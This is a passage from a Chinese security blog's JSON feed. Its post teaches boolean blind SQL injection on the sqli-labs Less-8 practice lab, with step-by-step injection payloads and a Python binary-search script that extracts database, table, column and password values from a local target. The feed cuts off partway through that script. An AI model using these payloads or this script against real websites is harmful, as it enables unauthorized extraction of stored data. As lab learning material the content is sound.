{
    "version": "https://jsonfeed.org/version/1",
    "title": "雨落新痕のblog • All posts by \"web安全\" tag",
    "description": "",
    "home_page_url": "https://mashiro.zone",
    "items": [
        {
            "id": "https://mashiro.zone/web%E5%AE%89%E5%85%A8/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/",
            "url": "https://mashiro.zone/web%E5%AE%89%E5%85%A8/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/",
            "title": "bool盲注",
            "date_published": "2021-08-24T09:17:10.000Z",
            "content_html": "<p><a id=\"more\"></a></p>\n<p>bool 盲注是用于页面回显可以表示正确和错误（一般无显示）两种的情况下使用的注入方法，通过页面反馈的信息来逐位判断字符，从而获取数据库信息，盲注在联合注入与报错注入禁用时可以使用，但他的缺点是效率很低，但可以使用二分法来缩短判断次数从而节约时间。</p>\n<h3 id=\"bool盲注的相关函数\"><a class=\"anchor\" href=\"#bool盲注的相关函数\">#</a> bool 盲注的相关函数</h3>\n<p>left () ：left (database (),1)='s' 从左往右截取前 b 位，正确返回 1，错误返回 0</p>\n<p>regexp:  select user () regexp 'r' 匹配 user 的正则表达式</p>\n<p>like: 同上，后面加上 %</p>\n<p>substr (a,b,c)  匹配 a 字符串，截取 a 字符串从第 b 位截取 c 位</p>\n<p>ascii () 转化为 ascii 字符串</p>\n<p>常用语句：</p>\n<p>select ascii(substr(select database(),1,1)=115</p>\n<p>以 sqllab-less8 为例</p>\n<h3 id=\"第一步先闭合确定字段数和数据库长度\"><a class=\"anchor\" href=\"#第一步先闭合确定字段数和数据库长度\">#</a> 第一步先闭合确定字段数和数据库长度</h3>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">?</span>id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token single-quoted-string string\">' order by 3--+</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>?id=1'</span><span class=\"token keyword\">and</span> <span class=\"token function\">length</span><span class=\"token punctuation\">(</span><span class=\"token function\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">7</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span></pre></td></tr></table></figure><p>若数据库长度大于 7 则显示</p>\n<h3 id=\"第二步确定数据库名称\"><a class=\"anchor\" href=\"#第二步确定数据库名称\">#</a> 第二步确定数据库名称</h3>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">?</span>id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token single-quoted-string string\">' and left((select database()),1)='</span>s'<span class=\"token operator\">--</span><span class=\"token operator\">+</span></pre></td></tr></table></figure><p>这一步可以用 burp 来完成。选择 burp 自带字典暴力破解，</p>\n<p>另一种方法可以使用二分法加快速度</p>\n<p>语句为</p>\n<p>?id=1' and ascii(substr((select schema_name from information_schema.schemata limit 1,1),1,1))&gt;10--+</p>\n<p>建议使用 sqlmap 或者写盲注脚本解决</p>\n<h3 id=\"第三步确定数据库的长度和表名方法类似\"><a class=\"anchor\" href=\"#第三步确定数据库的长度和表名方法类似\">#</a> 第三步确定数据库的长度和表名，方法类似</h3>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>表名长度</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">?</span>id<span class=\"token operator\">=</span><span class=\"token number\">1</span>' <span class=\"token keyword\">and</span> <span class=\"token punctuation\">(</span><span class=\"token function\">length</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>select table_name from information_schema<span class=\"token punctuation\">.</span>tables where table_schema<span class=\"token operator\">=</span><span class=\"token function\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> limit <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token number\">6</span> <span class=\"token operator\">--</span><span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>数据库名猜出来之后，我们来猜表名</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">and</span> <span class=\"token function\">ascii</span><span class=\"token punctuation\">(</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>select table_name from information_schema<span class=\"token punctuation\">.</span>tables where table_schema<span class=\"token operator\">=</span><span class=\"token function\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> limit <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">107</span> <span class=\"token operator\">--</span><span class=\"token operator\">+</span></pre></td></tr></table></figure><p>select table_name from information_schema.tables where table_schema=database()</p>\n<p>这条查询语句查询出来可能会查询出多个表（多个字符串）， 但是 substr 函数只能处理一个字符串， 所有我们要在后面加上 limit 函数，限制只能输出一个表（一个字符串） and ascii (substr ((select table_name from information_schema.tables where table_schema=database () limit 0,1),1,1))&gt;107—+</p>\n<p>回显正常 and ascii (substr ((select table_name from information_schema.tables where table_schema=database () limit 0,1),1,1))&gt;108</p>\n<p>回显失败说明这里的 ASCII 码是等于 108，那么对应的字符就是 英文字母 l 以此类推。我们把表所有字符全部猜完，(只需要把起始位置改一下就行，这里改成了第 2 个位置) 就知道完整的表名了。</p>\n<h3 id=\"第四步确定数据库的字段长度和名字方法类似\"><a class=\"anchor\" href=\"#第四步确定数据库的字段长度和名字方法类似\">#</a> 第四步确定数据库的字段长度和名字，方法类似</h3>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">and</span> <span class=\"token function\">ascii</span><span class=\"token punctuation\">(</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>select column_name from information_schema<span class=\"token punctuation\">.</span>columns where table_name<span class=\"token operator\">=</span><span class=\"token number\">0</span>x limit <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">108</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span></pre></td></tr></table></figure><h3 id=\"第五步确定数据库字段值方法类似\"><a class=\"anchor\" href=\"#第五步确定数据库字段值方法类似\">#</a> 第五步确定数据库字段值，方法类似</h3>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">and</span> <span class=\"token function\">ascii</span><span class=\"token punctuation\">(</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>select password from secuity<span class=\"token punctuation\">.</span>users  limit <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">108</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span></pre></td></tr></table></figure><h3 id=\"二分法盲注脚本\"><a class=\"anchor\" href=\"#二分法盲注脚本\">#</a> 二分法盲注脚本</h3>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/yuanoes/imagehost@main/pic/image-20210824220911329.png\" alt=\"image-20210824220911329\" /></p>\n<p>这里是用二分法依据以上 paylaod 写的脚本，按照 sqllab-less8 来完成，可根据不同情况更改 url 和页面回显 key，前提是确定注入的闭合</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> tkinter<span class=\"token punctuation\">.</span>constants <span class=\"token keyword\">import</span> TRUE</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">\"http://127.0.0.1/sqllab/Less-8/?id=1\"</span><span class=\"token comment\">#url 不带'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>key <span class=\"token operator\">=</span> <span class=\"token string\">\"You are in...........\"</span><span class=\"token comment\">#页面回显</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>a<span class=\"token operator\">=</span><span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>b<span class=\"token operator\">=</span><span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>c<span class=\"token operator\">=</span><span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># 注数据库名称</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dbname</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    dbname<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\">#假设在 100 个字符以内</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"已完成</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>j<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">%\"</span></span><span class=\"token punctuation\">)</span><span class=\"token comment\">#显示完成情况   </span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        j<span class=\"token operator\">+=</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        start<span class=\"token operator\">=</span><span class=\"token number\">32</span> <span class=\"token comment\">#空格</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        stop<span class=\"token operator\">=</span> <span class=\"token number\">127</span> <span class=\"token comment\">#del</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>start <span class=\"token operator\">&lt;</span> stop<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>                mid <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>start <span class=\"token operator\">+</span> stop<span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 整除</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                payload <span class=\"token operator\">=</span> <span class=\"token string\">\"' and ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;0&#125;,1))&lt;&#123;1&#125;--+\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">,</span>mid<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>                url1 <span class=\"token operator\">=</span> url <span class=\"token operator\">+</span> payload</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>                <span class=\"token comment\"># print(url1)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>                result <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>                result1 <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url <span class=\"token operator\">+</span> <span class=\"token string\">\"' and ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;0&#125;,1))=&#123;1&#125;--+\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">,</span>mid<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            <span class=\"token comment\"># 每次都判断一下 mid 位置是否正确</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>                <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>key <span class=\"token keyword\">in</span> result1<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>                    dbname<span class=\"token operator\">=</span>dbname<span class=\"token operator\">+</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>mid<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>                    </pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                    <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>            <span class=\"token comment\"># 判断一下长度的范围如果在 start 与 mid 之间，就把 stop 移到 mid 处，否则就把 start 移到 mid 处，利用二分法不断缩小范围</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>key  <span class=\"token keyword\">in</span> result<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>                    stop <span class=\"token operator\">=</span> mid</pre></td></tr><tr><td data-num=\"31\"></td><td><pre>                <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>                    start <span class=\"token operator\">=</span> mid  </pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token keyword\">return</span> dbname    </pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token comment\">#注数据库表名</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">TbName</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span>dbname<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    tbName <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">50</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\">#表名假设在 50 个字符以内</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        i <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        start <span class=\"token operator\">=</span> <span class=\"token number\">32</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        stop <span class=\"token operator\">=</span> <span class=\"token number\">127</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>start <span class=\"token operator\">&lt;</span> stop<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>            mid <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>start <span class=\"token operator\">+</span> stop<span class=\"token punctuation\">)</span><span class=\"token operator\">/</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>            payload <span class=\"token operator\">=</span> <span class=\"token string\">\"' and ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=\\\"&#123;0&#125;\\\"),&#123;1&#125;,1))>&#123;2&#125;--+\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>dbname<span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>mid<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>            reqUrl <span class=\"token operator\">=</span> url <span class=\"token operator\">+</span> payload</pre></td></tr><tr><td data-num=\"45\"></td><td><pre>            cont <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>reqUrl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>            conTrue <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url <span class=\"token operator\">+</span> <span class=\"token string\">\"' and ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=\\\"&#123;0&#125;\\\"),&#123;1&#125;,1))=&#123;2&#125;--+\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>dbname<span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>mid<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>key <span class=\"token keyword\">in</span> conTrue<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>                tbName <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>mid<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>tbName<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>                <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>            <span class=\"token keyword\">elif</span><span class=\"token punctuation\">(</span>key <span class=\"token keyword\">in</span> cont<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>                <span class=\"token comment\">#print(\"[+] start\",start,stop,mid)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>                start <span class=\"token operator\">=</span> mid</pre></td></tr><tr><td data-num=\"54\"></td><td><pre>            <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>                stop <span class=\"token operator\">=</span> mid</pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    <span class=\"token keyword\">return</span> tbName</pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token comment\">#注数据库列名</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">coName</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span>dbname<span class=\"token punctuation\">,</span>tableName<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    coName <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">25</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\">#假设字符在 50 以内</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>        i <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>       </pre></td></tr><tr><td data-num=\"63\"></td><td><pre>        start <span class=\"token operator\">=</span> <span class=\"token number\">32</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>        stop <span class=\"token operator\">=</span> <span class=\"token number\">127</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>        <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>start <span class=\"token operator\">&lt;</span> stop<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>            mid <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>start <span class=\"token operator\">+</span> stop<span class=\"token punctuation\">)</span><span class=\"token operator\">/</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>            payload <span class=\"token operator\">=</span> <span class=\"token string\">\"' and ascii(mid((select group_concat(column_name) from information_schema.columns where table_schema='&#123;0&#125;' and table_name='&#123;1&#125;'),&#123;2&#125;,1))>&#123;3&#125;--+\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>dbname<span class=\"token punctuation\">,</span>tableName<span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>mid<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>            reqUrl <span class=\"token operator\">=</span> url <span class=\"token operator\">+</span> payload</pre></td></tr><tr><td data-num=\"69\"></td><td><pre>            cont <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>reqUrl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>            conTrue <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url <span class=\"token operator\">+</span> <span class=\"token string\">\"' and ascii(mid((select group_concat(column_name) from information_schema.columns where table_schema='&#123;0&#125;' and table_name='&#123;1&#125;'),&#123;2&#125;,1))=&#123;3&#125;--+\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>dbname<span class=\"token punctuation\">,</span>tableName<span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>mid<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>key <span class=\"token keyword\">in</span> conTrue<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>                coName <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>mid<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>coName<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>                <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>            <span class=\"token keyword\">elif</span><span class=\"token punctuation\">(</span>key <span class=\"token keyword\">in</span> cont<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>                <span class=\"token comment\">#print(\"[+] start\",start,stop,mid)</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>                start <span class=\"token operator\">=</span> mid</pre></td></tr><tr><td data-num=\"78\"></td><td><pre>            <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>                stop <span class=\"token operator\">=</span> mid</pre></td></tr><tr><td data-num=\"80\"></td><td><pre>    <span class=\"token keyword\">return</span> coName</pre></td></tr><tr><td data-num=\"81\"></td><td><pre><span class=\"token comment\">#注字段值</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">DataName</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span>ColumnName<span class=\"token punctuation\">,</span>tableName<span class=\"token punctuation\">,</span>dbname<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>    DtName <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>        i <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>        </pre></td></tr><tr><td data-num=\"87\"></td><td><pre>        start <span class=\"token operator\">=</span> <span class=\"token number\">32</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>        stop <span class=\"token operator\">=</span> <span class=\"token number\">127</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>        <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>start <span class=\"token operator\">&lt;</span> stop<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>            mid <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>start <span class=\"token operator\">+</span> stop<span class=\"token punctuation\">)</span><span class=\"token operator\">/</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>            payload <span class=\"token operator\">=</span> <span class=\"token string\">\"' and ascii(mid((select group_concat(&#123;0&#125;) from &#123;1&#125;.&#123;2&#125;),&#123;3&#125;,1))>&#123;4&#125;%23\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>ColumnName<span class=\"token punctuation\">,</span>dbname<span class=\"token punctuation\">,</span>tableName<span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>mid<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>            reqUrl <span class=\"token operator\">=</span> url <span class=\"token operator\">+</span> payload</pre></td></tr><tr><td data-num=\"93\"></td><td><pre>            <span class=\"token comment\">#print(reqUrl)</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>            cont <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>reqUrl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>            conTrue <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url <span class=\"token operator\">+</span> <span class=\"token string\">\"' and ascii(mid((select group_concat(&#123;0&#125;) from &#123;1&#125;.&#123;2&#125;),&#123;3&#125;,1))=&#123;4&#125;%23\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>ColumnName<span class=\"token punctuation\">,</span>dbname<span class=\"token punctuation\">,</span>tableName<span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>mid<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>            <span class=\"token comment\"># print(url + \"' and ascii(mid((select group_concat(&#123;0&#125;) from &#123;1&#125;),&#123;2&#125;,1))>&#123;3&#125;%23\".format(ColumnName,tableName,i,str(mid)))</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>key <span class=\"token keyword\">in</span> conTrue<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>                DtName <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>mid<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>DtName<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>                <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>            <span class=\"token keyword\">elif</span><span class=\"token punctuation\">(</span>key <span class=\"token keyword\">in</span> cont<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>                <span class=\"token comment\">#print(\"[+] 